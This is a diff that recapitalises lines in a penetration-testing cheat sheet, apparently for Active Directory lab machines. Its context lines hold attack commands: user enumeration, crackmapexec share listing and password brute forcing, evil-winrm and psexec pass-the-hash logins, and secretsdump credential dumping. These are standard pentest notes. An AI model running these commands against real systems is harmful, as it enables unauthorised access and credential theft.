@@ -11,13 +11,13 @@ querydispinfo	# anything in description field
 index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.doe     Name: Adrian Doe   Desc: (null)
 queryuser 0x464 # see more info
 ```
-get only usernames:
+Get only usernames from enumdomusers:
 ```
 cat file | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.txt
 ```
 
 ## enum shares
-with the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
+With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 ```
 crackmapexec smb 10.10.1.2 --shares
 crackmapexec smb 10.10.1.2 -u '' -p '' --shares
@@ -36,7 +36,7 @@ https://github.com/ropnop/kerbrute
 ```
 
 ## brute force
-with the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
+With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 Get the password policy:
 ```
 crackmapexec smb 10.10.1.2 --pass-pol
@@ -45,7 +45,7 @@ Check the accountlockout option before you start a brute force. Also you can che
 ```
 crackmapexec smb 10.10.1.2 -u users.txt -p password.txt 
 ```
-make sure you update to the latest version if you want to use this:
+Make sure you update to the latest version if you want to use this:
 ```
 cme smb 10.10.10.182 -u username -p password -M spider_plus
 ```
@@ -77,13 +77,13 @@ cat ldapdump | awk '{print s$1}' | sort | uniq -c| sort -nr | grep :
 If you find anything interessting search for it in the dump
 
 ## gaining access
-check
-with the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
+Check
+With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 ```
 cme winrm 10.10.1.2 -u username -p password
 cme winrm 10.10.1.2 -u username -H ntlmhash
 ```
-evil-winrm: (when it's not installed use this, otherwise it's just 'evil-winrm -i ... etc')
+Evil-winrm: (when it's not installed use this, otherwise it's just 'evil-winrm -i ... etc')
 ```
 ruby evil-winrm.rb -i 10.10.1.2 -u username -p password
 ruby evil-winrm.rb -i 10.10.1.2 -u username -H ntlmhash
@@ -102,7 +102,7 @@ secretsdump.py domainname.local/username@10.10.2.1
 ```
 
 ### pcexec.py
-format for hash is LMHASH:NTHASH, but you can use the NTLM hash twice because windows doesn't really use LMHASH
+Format for hash is LMHASH:NTHASH, but you can use the NTLM hash twice because windows doesn't really use LMHASH
 ```
 psecex.py domainname.local/username@10.10.2.1 -hashes NTLM:NTLM
 
